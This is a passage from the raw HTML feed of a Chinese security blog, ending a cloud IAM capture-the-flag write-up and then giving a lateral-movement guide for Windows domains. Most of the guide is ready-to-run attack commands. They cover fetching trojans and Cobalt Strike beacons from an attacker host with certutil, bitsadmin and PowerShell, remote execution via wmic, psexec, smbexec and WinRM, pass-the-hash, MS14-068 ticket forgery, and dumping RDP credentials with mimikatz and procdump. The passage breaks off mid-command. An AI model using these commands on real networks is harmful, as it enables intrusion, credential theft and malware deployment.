class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;Federated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cognito-identity.amazonaws.com&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringEquals&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;cognito-identity.amazonaws.com:aud&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>题目中有这样一段描述</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Anonymous access no more. <span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s see what can you do now.</span><br><br>Now <span class="hljs-keyword">try</span> it <span class="hljs-keyword">with</span> the authenticated role: arn:aws:iam::<span class="hljs-number">092297851374</span>:role/Cognito_s3accessAuth_Role<br></code></pre></td></tr></table></figure><p>也就是说现在匿名的用户时没办法通过身份池ID获取临时凭证的了，但是policy中允许了一个AssumeRoleWithWebIdentity的操作，通过查阅<a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">官方文档</a>发现通过该操作可以生成STS，生成STS需要三个信息：</p><ul><li>role-arn </li><li>role-session-name </li><li>web-identity-token</li></ul><p>role-arn在题目描述中已经给出<code>arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</code>，role-session-name可以随便起，web-identity-token可以通过身份池ID去获得，而且生成Token的相关接口都是公开的，可以被直接调用，不需要授权。<br>首先先使用aws cli根据身份池ID获取<a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html">身份ID</a><br><img src="/.com//bVc9bUB"><br>之后根据身份ID获取<a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html">web-identity-token</a><br><img src="/.com//bVc9bUD"><br>现在我们就可以通过AssumeRoleWithWebIdentity生成STS了<br><img src="/.com//bVc9bUE"><br>之后的步骤其实和上一题差不多，配置aws cli的ak sk sessiontoken。之后使用aws cli先列出s3的bucket 之后读取其中的flag即可<br><img src="/.com//bVc9bUM"><br><img src="/.com//bVc9bUO"><br>成功通关<br><img src="/.com//bVc9bUP"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/640694595">蚁景安全</a></li><li><a href="https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html">teamsSix Wiki</a></li><li><a href="https://docs.aws.amazon.com/">aws文档</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内网横向移动</title>
    <link href="/cllafrcou000lfout59hohvll/"/>
    <url>/cllafrcou000lfout59hohvll/</url>
    
    <content type="html"><![CDATA[<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>当我们拿下域内某台机器时，需要以此机器为跳板继续渗透域内其他的机器。此时可能就需要从这台跳板机中获取文件（木马等），此时有以下几种方法可以让目标机器从跳板机上获取文件</p><ol><li>建立连接<br>使用下面提到的IPC连接<br>建立连接：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:[domain]\username<br><span class="hljs-built_in">copy</span> \\ip\<span class="hljs-built_in">path</span> payload.exe(先是跳板机的木马地址 后是木马在目标机器保存的位置)<br></code></pre></td></tr></table></figure></li><li>搭建匿名smb服务器<br>搭建过程见<a href="https://zhuanlan.zhihu.com/p/405303912">https://zhuanlan.zhihu.com/p/405303912</a><br>建立连接后可以直接用下面的命令即可从跳板机下载木马<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">copy</span> \\ip\<span class="hljs-built_in">path</span> payload.exe(先是跳板机的木马地址 后是木马在目标机器保存的位置)<br></code></pre></td></tr></table></figure></li><li>Windows自带命令（适用于开启了http服务）</li></ol><ul><li>certutil -urlcache split -f <a href="http://ip:port/shell.exe">http://ip:port/shell.exe</a> C:\shell.exe</li><li>bitsadmin &#x2F;transfer test <a href="http://ip:port/shell.exe">http://ip:port/shell.exe</a> C:\shell.exe</li><li>powershell: (New-Object Net.WebClient).DownloadFIle(‘<a href="http://ip:port/shell.exe','C:\shell.exe">http://ip:port/shell.exe&#39;,&#39;C:\shell.exe</a>‘)</li></ul><h2 id="ipc横向移动"><a href="#ipc横向移动" class="headerlink" title="ipc横向移动"></a>ipc横向移动</h2><p>通过前期信息收集得到的账号密码，内网主机ip信息，进行ipc连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net use \\ip\ipc$ &quot;password&quot; /user:[domain\]username<br></code></pre></td></tr></table></figure><p>建立连接后即可使用copy命令（copy beacon.exe \192.168.3.21\c$）将木马上传过去。此时需要注意的是可能会出现拒绝访问的错误，这是因为连接的用户权限不够导致的，尝试用administrator用户连接即可成功上传<br>上传之后根据操作系统不同使用不同的方式运行木马</p><ul><li>at (&lt; Windows2012): </li><li>schtasks (&gt;&#x3D;Windows2012)</li></ul><h2 id="wmi横向移动-135端口"><a href="#wmi横向移动-135端口" class="headerlink" title="wmi横向移动(135端口)"></a>wmi横向移动(135端口)</h2><ol><li>wmic (系统自带，但无回显，可以创建进程)<br>由于无回显，所以只能使用命令下载跳板机上的木马，再执行此木马使得cs上线<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmic /node:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span> /user:administrator /password:admin!@#<span class="hljs-number">45</span> process <span class="hljs-keyword">call</span> create &quot;<span class="hljs-built_in">cmd</span>.exe /c certutil -urlcache -split -f http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">31</span>/beacon.exe c:/beacon.exe&quot;<br>wmic /node:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span>/user:administrator /password:admin!@#<span class="hljs-number">45</span> process <span class="hljs-keyword">call</span> create &quot;<span class="hljs-built_in">cmd</span>.exe c:/beacon.exe&quot;<br></code></pre></td></tr></table></figure></li><li>cscript（需要上传文件，交互式）<br>需要上传wmiexec.vbs<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">需要上传wmiexec.vbs<br></code></pre></td></tr></table></figure>由于会将192.168.3.21的cmd反弹回来，所以在cs上执行可能会卡住，无法利用。<br>解决方法有两种，一是利用cs的远程桌面功能直接远控跳板机，在图形界面上操作反弹回来的192.168.3.21的cmd<br>二是将cs的权限移交给msf，在msf上使用上述命令</li><li>wmiexec(impacket工具包)<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmiexec ./administrator:admin!@#<span class="hljs-number">45</span>@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span> &quot;whoami&quot;<br>wmiexec -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span>&quot;whoami&quot;<br></code></pre></td></tr></table></figure></li></ol><h2 id="SMB横向移动-445端口"><a href="#SMB横向移动-445端口" class="headerlink" title="SMB横向移动(445端口)"></a>SMB横向移动(445端口)</h2><ol><li>psexec(pstools工具包)<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">psexec64</span> \\<span class="hljs-number">192.168.3.32</span> -u administrator -p admin!@<span class="hljs-comment">#45 -s cmd</span><br></code></pre></td></tr></table></figure></li><li>psexec(impacket工具包)<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">psexec</span> -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator@<span class="hljs-number">192.168.3.32</span><br></code></pre></td></tr></table></figure></li><li>smbexec(impacket工具包)<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">smbexec</span> ./administrator:admin!@#<span class="hljs-number">45</span>@<span class="hljs-number">192.168.3.32</span><br><span class="hljs-attribute">smbexec</span> -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c god/administrator@<span class="hljs-number">192.168.3.32</span>s<br></code></pre></td></tr></table></figure></li><li>service(需要先上传木马)<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">services -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c./administrator:@<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.32</span> <span class="hljs-built_in">create</span> -name <span class="hljs-built_in">shell</span> -display shellexec -path C:\Windows\System32\<span class="hljs-built_in">shell</span>.exe<br>services -hashes :<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c./administrator:@<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.32</span> <span class="hljs-built_in">start</span> -name <span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure></li><li>smbclient<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">smbclient -L <span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>10.10.156.76<span class="hljs-symbol">\\</span>  -U svc-admin 输入密码后列出所有smb共享<br>smbclient <span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>10.10.156.76<span class="hljs-symbol">\\</span>backup -U svc-admin 连接backup共享（若通过上一步列出的共享列表中有backup则可以通过svc-admin的密码连接backup）<br></code></pre></td></tr></table></figure></li></ol><p>前三种方式都会返回一个cmd，需要cs配合msf进行使用，其中psexec通过smb连接  目标主机的ADMIN$共享，释放一个psexecsvc.exe的可执行文件，创建一个名为psexecsvc的服务执行此exe文件</p><h2 id="pth横向移动"><a href="#pth横向移动" class="headerlink" title="pth横向移动"></a>pth横向移动</h2><p>pth即pass the hash 通过ntlm hash值横向移动</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz privilege::debug<br>mimikatz sekurlsa::pth /user:administrator /domain:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>/ntlm:ccef208c6485269c20db2cad21734fe7<br>（此处会返回一个<span class="hljs-built_in">cmd</span>，下面的命令需要在返回的<span class="hljs-built_in">cmd</span>中执行。同时，正因为需要在返回的<span class="hljs-built_in">cmd</span>中进行操作，cs的beacon交互是无法进行相关操作的，所以需要使用steal_token pid进行进程劫持，或者使用cs的远程桌面功能，或者将cs移交msf）<br><span class="hljs-built_in">net</span> use \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>\c$<br><span class="hljs-built_in">copy</span> beacon.exe \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>\c$<br>#<span class="hljs-built_in">at</span> &lt; Windows2012<br><span class="hljs-built_in">at</span> \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\beacon.exe （其中<span class="hljs-number">15</span>:<span class="hljs-number">47</span>为任务执行时间）<br>#schtasks &gt;=Windows2012<br>schtasks /create /s <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span> /ru &quot;SYSTEM&quot;/tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件<br>schtasks /run /s <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">32</span>/tn beacon /i #运行beacon任务<br>schtasks /delete /s <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span>/tn beacon /f#删除beacon任务<br></code></pre></td></tr></table></figure><h2 id="ptt横向移动"><a href="#ptt横向移动" class="headerlink" title="ptt横向移动"></a>ptt横向移动</h2><ol><li>MS14068 （webadmin权限即可）</li></ol><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ol><li>如果再asreq阶段指定include-pac为false则再asres阶段返回的tgt中将不会有pac</li><li>pac中虽然指定了校验和算法，但是可以更改校验和算法为md5，绕过校验和</li></ol><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">whoami</span>/user 获取sid<br><span class="hljs-attribute">ms14</span>-<span class="hljs-number">068</span>.exe -u webadmin@god.org -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1218902331</span>-<span class="hljs-number">2157346161</span>-<span class="hljs-number">1782232778</span>-<span class="hljs-number">1132</span> -d <span class="hljs-number">192.168.3.21</span>-p admin!@#<span class="hljs-number">45</span>（-s sid -d dc_ip -p 明文密码 --rc4：在没有明文密码的情况下，通过NTLM Hash登录）<br><span class="hljs-attribute">klist</span> purge 清除原有凭证，防止干扰<br><span class="hljs-attribute">mimikatz</span> kerberos::ptc TGT_webadmin@god.org.ccache  将生成的tgt使用mimikatz导入内存，其中TGT_webadmin@god.org.ccache为tgt文件名<br><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.21</span>\c$<br><span class="hljs-attribute">copy</span> beacon.exe \\<span class="hljs-number">192.168.3.21</span>\c$<br><span class="hljs-comment">#at &lt; Windows2012</span><br><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\beacon.exe （其中<span class="hljs-number">15</span>:<span class="hljs-number">47</span>为任务执行时间）<br><span class="hljs-comment">#schtasks &gt;=Windows2012</span><br><span class="hljs-attribute">schtasks</span> /create /s <span class="hljs-number">192.168.3.32</span> /ru <span class="hljs-string">&quot;SYSTEM&quot;</span>/tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件<br><span class="hljs-attribute">schtasks</span> /run /s <span class="hljs-number">192.168.3.32</span>/tn beacon /i #运行beacon任务<br><span class="hljs-attribute">schtasks</span> /delete /s <span class="hljs-number">192.168.3.21</span>/tn beacon /f#删除beacon任务<br></code></pre></td></tr></table></figure><h2 id="winrm横向移动"><a href="#winrm横向移动" class="headerlink" title="winrm横向移动"></a>winrm横向移动</h2><p>WinRM代表Windows远程管理，是一种允许管理员远程执行系统管理任务的服务。默认端口为5985</p><p>默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。<br>移动条件：双方都启用的Winrm rs的服务</p><p>使用此服务需要管理员级别凭据。<br>Windows 2008 以上版本默认自动状态，Windows Vista&#x2F;win7上必须手动启动；<br>Windows 2012之后的版本默认允许远程任意主机来管理。</p><p>查看是否开启winrm：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Class</span> win32_service | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123;$_.name -<span class="hljs-keyword">like</span> &quot;WinRM&quot;&#125;<br>或者<br><span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Class</span> win32_service | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123;$_.name -<span class="hljs-keyword">like</span> &quot;WinRM&quot;&#125;<br></code></pre></td></tr></table></figure><p>开启winrm服务</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">winrm quickconfig 或 winrm quickconfig -<span class="hljs-selector-tag">q</span><br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">winrs</span> -r:<span class="hljs-number">192.168.3.32</span> -u:<span class="hljs-number">192.168.3.32</span>\administrator -p:admin!@#<span class="hljs-number">45</span> <span class="hljs-string">&quot;whoami&quot;</span>(执行命令，非交互式)<br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023126521-004130ce-9266-45be-b580-c3a340881f13.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023117250-803bfc94-adad-4738-abe6-9945f88e84d4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">winrs</span> -r:<span class="hljs-number">192.168.3.21</span> -u:god\administrator -p:admin!@#<span class="hljs-number">45</span> <span class="hljs-string">&quot;cmd&quot;</span>(返回cmd，交互式)<br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666023069722-a8992d1a-35c7-4226-b482-c8a47c6e6287.png"><br>或依次执行下面的命令也可以返回一个交互式shell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">$User=&quot;god\administrator&quot;<br>$Password=ConvertTo-SecureString -String &quot;Admin12345&quot; -AsPlainText -Force<br>$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password<br>New-PSSession -Name WinRM1 -ComputerName <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">21</span> -Credential $Cred -Port <span class="hljs-number">5985</span><br>Enter-PSSession -Name WinRM1<br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666045577335-4c7c3853-8be2-449a-b95c-8c0a6df73b89.png"></p><p>若遇到下面的报错信息：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1661952471796-80a2802e-042a-483f-9798-82e655633a26.png"><br>则设置winrm信任所有主机即可</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">Set</span>-Item WSMan:localhost\Client\TrustedHosts -Value &#x27;*&#x27;<br></code></pre></td></tr></table></figure><p>查看信任主机列表：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Item</span> <span class="hljs-variable">WSMan</span><span class="hljs-operator">:</span>\<span class="hljs-variable">localhost</span>\<span class="hljs-variable">Client</span>\<span class="hljs-variable">TrustedHosts</span><br></code></pre></td></tr></table></figure><h2 id="RDP横向移动"><a href="#RDP横向移动" class="headerlink" title="RDP横向移动"></a>RDP横向移动</h2><p>远程桌面服务 支持明文及HASH连接<br>条件：对方开启RDP服务 远程桌面（开放3389端口）<br>明文连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mstsc /console /v:192.168.3.32 /admin<br></code></pre></td></tr></table></figure><p>HASH连接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz privilege::debug<br>mimikatz sekurlsa::pth <span class="hljs-regexp">/user:administrator /</span>domain:<span class="hljs-number">192.168</span>.<span class="hljs-number">3.32</span> <span class="hljs-regexp">/ntlm:518b98ad4178a53695dc997aa02d455c &quot;/</span>run:mstsc /restrictedadmin<span class="hljs-string">&quot;\</span><br></code></pre></td></tr></table></figure><p>设置开启rdp 3389端口 :</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><p>通过代理连接：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> rdesktop <span class="hljs-number">192.168.52.141</span><br></code></pre></td></tr></table></figure><p>除此之外还可以尝试获取机器中存储的rdp凭据，通过cmdkey &#x2F;list可以获取当前保存的凭据<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663069985190-4592aa25-8039-4728-902c-92e7deb5aae3.png"></p><p>获取rdp凭据的方式有如下几种：</p><h3 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h3><p>使用<code># mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Credentials\&lt;凭据文件&gt;&quot;</code>命令获取到指定凭据文件的pddata和guidMasterkey（其中凭据文件可以在<code>C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Credentials\</code>内获取）<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070301798-d7e49ff9-7385-47b0-ad6c-bb90677b560d.jpeg"><br>之后通过<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot;</code>命令可以找到guidMasterkey对应的Masterkey<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070340949-216ef551-d7cc-4a29-834e-0e82ae3e4892.jpeg"></p><p>之后使用下面的命令即可破解凭据获得明文密码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;dpapi::cred /in:C:\Users\bunny\AppData\Local\Microsoft\Credentials\4D8F543ACD10B143849414A5085FE4E6 /masterkey:53c01b9679dc0e55b91584781fe13eb1c5faa2694fc693f98838fedd74d3ad371754b9d9d841769882c8e14c965e4ae40a45dce88101cf5831fc4d694cc38e81&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070386528-caac260b-53eb-49fd-8aa7-58a9775d9cc0.jpeg"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1663070441290-4dcc20b3-1566-4c03-8530-085db1d6b0f3.jpeg"></p><h3 id="通过svchosts-exe获取明文凭据。"><a href="#通过svchosts-exe获取明文凭据。" class="headerlink" title="通过svchosts.exe获取明文凭据。"></a>通过svchosts.exe获取明文凭据。</h3><p>由于凭据是明文存储在svchosts中的所以可以直接使用prodump转储svchosts的内存进行查找。<br>不过需要注意的是可能同时有多个svchosts.exe进程。需要通过以下命令确定哪个进程的内存中有rdp明文凭据</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sc</span> <span class="hljs-variable">queryex</span> <span class="hljs-variable">termservice</span><br><span class="hljs-variable">tasklist</span> <span class="hljs-operator">/</span><span class="hljs-variable">M</span><span class="hljs-operator">:</span><span class="hljs-variable">rdpcorets</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-variable">netstat</span> <span class="hljs-operator">-</span><span class="hljs-variable">nob</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Select</span><span class="hljs-operator">-</span><span class="hljs-built_in">String</span> <span class="hljs-variable">TermService</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Context</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>通过这三个命令获取svchosts的pid号，之后使用procdump转储svchosts获取明文凭据</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">ma</span> <span class="hljs-number">4616</span> -accepteula C:\Users\Administrator\Desktop<br></code></pre></td></tr></table></figure><p>转储成功后生成 svchost.exe_210714_012426.dmp 文件，大约 137 MB，RDP 的连接凭据就以明文的形式存储在这个文件里面，如下我们可以通过 strings 命令将明文凭据检索出来，密码位于用户名的下方   </p><h3 id="在已有的RDP中导出："><a href="#在已有的RDP中导出：" class="headerlink" title="在已有的RDP中导出："></a>在已有的RDP中导出：</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>ts::logonpasswords<br></code></pre></td></tr></table></figure><h3 id="rdp劫持"><a href="#rdp劫持" class="headerlink" title="rdp劫持"></a>rdp劫持</h3><p>对于开启rdp的计算机来说，当多个用户进行登录时会产生多个会话，如果此时我们获取到了system权限，就可以通过system权限劫持其他用户的rdp登录目标系统，即使该会话已经断开</p><p>query user 查看主机上存在的其他用户的会话记录，其中有id选项</p><p>tscon id即可切换到其他用户的桌面</p><h2 id="DCOM横向移动"><a href="#DCOM横向移动" class="headerlink" title="DCOM横向移动"></a>DCOM横向移动</h2><p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成<br>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。<br>获取本机的DCOM列表：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">CimInstance</span> <span class="hljs-type">Win32_DCOMApplication</span><br></code></pre></td></tr></table></figure><p>使用DCOM本机执行命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span 